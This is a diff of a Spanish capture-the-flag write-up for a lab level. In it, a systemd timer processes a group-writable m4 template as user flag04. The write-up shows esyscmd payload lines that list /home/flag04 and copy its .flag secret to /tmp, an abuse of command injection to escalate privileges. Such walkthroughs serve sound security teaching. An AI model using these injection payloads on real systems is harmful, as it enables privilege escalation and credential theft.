@@ -2,14 +2,14 @@
 
 ## Tipo de ejercicio
 
-Inyección de comandos en una plantilla `m4` modificable por un grupo de
-usuarios y procesada periódicamente con los privilegios de `flag04`.
+Análisis de un proceso automático y de los archivos que utiliza.
 
 ## Objetivo
 
 Encontrar la credencial que permite conectarse al usuario `level05`.
 
-El mecanismo es el generador de configuración `babel`.
+Para conseguirla, hay que descubrir qué proceso automático puede ejecutar
+acciones con los permisos de `flag04`.
 
 ## 1. Inspeccionar el nivel
 
@@ -22,14 +22,32 @@ ls -la
 cat README
 ```
 
+Estos comandos confirman la identidad y la ubicación de la sesión. `whoami`
+muestra el usuario actual, `pwd` el directorio de trabajo, `ls -la` todos los
+archivos incluidos los ocultos y `cat README` lee la pista del nivel.
+
 El README contiene la pista:
 
 ```text
 In the beginning was the Word.
 ```
 
-El directorio personal no contiene archivos adicionales. El script de
-configuración se encuentra en:
+El resultado de `ls -la` no muestra más pistas en el directorio personal. Como
+el ejercicio puede utilizar archivos fuera de ese directorio, examinamos los
+archivos propios del nivel:
+
+```bash
+find /opt/snowcrash/level04 -maxdepth 2 -type f -print
+
+```
+Resultado relevante:
+
+```text
+/opt/snowcrash/level04/babel.sh
+```
+
+El resultado muestra el archivo `babel.sh` dentro del directorio del nivel.
+Ahora comprobamos sus permisos, su tipo y su contenido:
 
 ```bash
 ls -la /opt/snowcrash/level04
@@ -38,7 +56,12 @@ file /opt/snowcrash/level04/babel.sh
 sed -n '1,240p' /opt/snowcrash/level04/babel.sh
 ```
 
-El script procesa la plantilla:
+`ls -la` muestra los archivos del directorio.
+`ls -l` muestra los permisos y el propietario de `babel.sh`.
+`file` identifica su tipo sin ejecutarlo, y
+`sed -n '1,240p'` muestra sus primeras 240 líneas para analizar qué hace.
+
+La salida de `sed` confirma que el script procesa la plantilla:
 
 ```text
 /var/lib/babel/templates/template.m4
@@ -50,9 +73,39 @@ y genera:
 /var/lib/babel/output.conf
 ```
 
-## 2. Analizar el servicio Babel
+## 2. Descubrir y analizar el servicio Babel
 
-La configuración del servicio y de su temporizador se consulta con:
+Primero se buscan referencias a `babel` en `systemd`:
+
+```bash
+grep -R -n 'babel' /etc/systemd/system 2>/dev/null
+```
+
+Resultado:
+
+```text
+/etc/systemd/system/timers.target.wants/babel.timer:3:Requires=babel.service
+/etc/systemd/system/babel.service:8:ExecStart=/opt/snowcrash/level04/babel.sh
+/etc/systemd/system/babel.timer:3:Requires=babel.service
+```
+
+En la primera línea aparece `timers.target.wants`, la carpeta que systemd usa
+para registrar los temporizadores habilitados. Por eso esa línea solo confirma
+que `babel.timer` está activado; la configuración que necesitamos está en
+`/etc/systemd/system/babel.timer`, que se lee más abajo.
+Las otras dos líneas señalan directamente las definiciones del servicio y del temporizador.
+
+Ahora se hacen dos comprobaciones independientes:
+
+```bash
+systemctl list-units --type=service --all | grep -i babel
+systemctl list-timers --all --no-pager | grep -i babel
+```
+
+`list-units` confirma que el servicio está cargado y `list-timers` muestra el
+temporizador y su programación.
+
+Por último, se leen las dos definiciones principales:
 
 ```bash
 cat /etc/systemd/system/babel.service
@@ -74,19 +127,40 @@ El temporizador ejecuta Babel cada 30 segundos:
 OnUnitActiveSec=30s
 ```
 
+`OnUnitActiveSec=30s` indica que el servicio se vuelve a ejecutar 30 segundos
+después de cada activación. Por eso no se ejecuta `babel.sh` directamente: se
+deja que el temporizador procese la plantilla como `flag04`.
+
 Por tanto, cualquier contenido malicioso añadido a la plantilla será
 procesado automáticamente con los permisos de `flag04`.
 
 ## 3. Confirmar los permisos de la plantilla
 
+La salida de `sed` ya ha mostrado la ruta de la plantilla:
+`/var/lib/babel/templates/template.m4`. Ahora comprobamos quién puede acceder a ella y modificarla.
+
 ```bash
 id
 ls -ld /var/lib/babel/templates
-ls -l /var/lib/babel/templates/template.m4
-test -w /var/lib/babel/templates/template.m4 \\
-	&& echo "template escribible" \\
+ls -l /var/lib/babel/templates
+test -w /var/lib/babel/templates/template.m4 \
+	&& echo "template escribible" \
 	|| echo "template no escribible"
 ```
+
+`id` muestra la identidad de `level04` y los grupos a los que pertenece. La
+pertenencia al grupo `babel` será importante si la plantilla también pertenece
+a ese grupo y tiene permisos de escritura para él.
+
+`ls -ld /var/lib/babel/templates` muestra los permisos, el propietario y el
+grupo del directorio, sin listar su contenido.
+
+`ls -l /var/lib/babel/templates` lista los archivos que hay dentro y permite
+comprobar que existe `template.m4`, además de mostrar sus permisos, propietario
+y grupo.
+
+`test -w` comprueba si el archivo se puede escribir. `&&` muestra el primer
+mensaje si la prueba tiene éxito y `||` muestra el segundo si falla.
 
 Resultado relevante:
 
@@ -97,27 +171,43 @@ drwxrwxr-x 2 root babel ... /var/lib/babel/templates
 template escribible
 ```
 
-El usuario `level04` pertenece al grupo `babel` y puede modificar
-`template.m4`. La plantilla utiliza macros de `m4`, por ejemplo `define` e
-`ifelse`, por lo que también permite utilizar la macro especial `esyscmd`.
+El usuario `level04` pertenece al grupo `babel`, la plantilla pertenece al
+mismo grupo y tiene permiso de escritura para él. La salida de `test -w`
+confirma que `level04` puede modificar `template.m4`.
 
-## 4. Reconocer el directorio de flag04
+Ahora se puede consultar el contenido actual de la plantilla:
 
-El payload independiente de reconocimiento está disponible en
-[babel-recon.m4](babel-recon.m4). Su contenido ejecuta `ls` como parte del
-procesamiento de `m4` y guarda la salida en `/tmp`:
+```bash
+cat /var/lib/babel/templates/template.m4
+```
+
+`m4` es un programa externo instalado en la OVA. El script `babel.sh` lo
+ejecuta para leer `template.m4` y generar `output.conf`.
+
+Se puede comprobar que está instalado con:
+
+```bash
+command -v m4
+m4 --version
+```
+
+`esyscmd` no es otro programa: es una macro integrada en `m4`. Cuando `m4`
+encuentra una línea como esta:
 
 ```m4
 esyscmd(`/bin/ls -la /home/flag04 > /tmp/babel_flag04_listing.txt')dnl
 ```
 
-Para introducirlo en la OVA:
+ejecuta `/bin/ls -la /home/flag04` mediante un shell. La salida se redirige al
+archivo indicado en `/tmp`; por tanto, al modificar la plantilla, `level04`
+puede hacer que el servicio ejecute comandos con los permisos de `flag04`.
 
-```bash
-cat >> /var/lib/babel/templates/template.m4 <<'EOF'
-esyscmd(`/bin/ls -la /home/flag04 > /tmp/babel_flag04_listing.txt')dnl
-EOF
-```
+La salida de `cat` muestra que esta línea de reconocimiento ya está en
+`template.m4`. No la añadimos otra vez: esperamos a que el temporizador
+procese la plantilla y comprobamos después el archivo que genera.
+
+
+## 4. Reconocer el directorio de flag04
 
 Después de la siguiente ejecución del temporizador:
 
@@ -126,6 +216,15 @@ systemctl status babel.service --no-pager
 ls -l /tmp/babel_flag04_listing.txt
 cat /tmp/babel_flag04_listing.txt
 ```
+
+`systemctl status` muestra el estado del servicio y si se produjo algún error.
+`ls -l` comprueba que el archivo se ha creado y muestra sus permisos,
+propietario y tamaño.
+`cat` lee el listado que el comando `/bin/ls -la /home/flag04`, incluido en la
+plantilla, ha guardado en ese archivo.
+
+El archivo se crea durante el procesamiento de Babel, por lo que hay que
+esperar al siguiente ciclo del temporizador antes de leerlo.
 
 El listado reveló el archivo protegido:
 
@@ -139,30 +238,26 @@ La ruta del secreto es:
 /home/flag04/.flag
 ```
 
+
 ## 5. Extraer la credencial
 
-El payload independiente de extracción está disponible en
-[babel-extract.m4](babel-extract.m4). Este ejecuta `cat` como `flag04` y
-guarda el resultado en un archivo temporal:
+La plantilla ya contiene una línea que lee `.flag` como `flag04` y guarda el
+resultado en `/tmp/level04_flag.txt`:
 
 ```m4
 esyscmd(`/bin/cat /home/flag04/.flag > /tmp/level04_flag.txt')dnl
 ```
 
-Se añade a la plantilla de la misma forma:
-
-```bash
-cat >> /var/lib/babel/templates/template.m4 <<'EOF'
-esyscmd(`/bin/cat /home/flag04/.flag > /tmp/level04_flag.txt')dnl
-EOF
-```
-
-Tras la siguiente ejecución de Babel:
+`babel` la procesa en el siguiente ciclo del temporizador y ejecuta `cat` con
+los permisos de `flag04`. Tras esa ejecución:
 
 ```bash
 ls -l /tmp/level04_flag.txt
 cat /tmp/level04_flag.txt
 ```
+
+El primer payload de reconocimiento permanece en la plantilla; el segundo
+payload se ejecuta después y escribe la flag en `/tmp/level04_flag.txt`.
 
 La credencial obtenida fue:
 
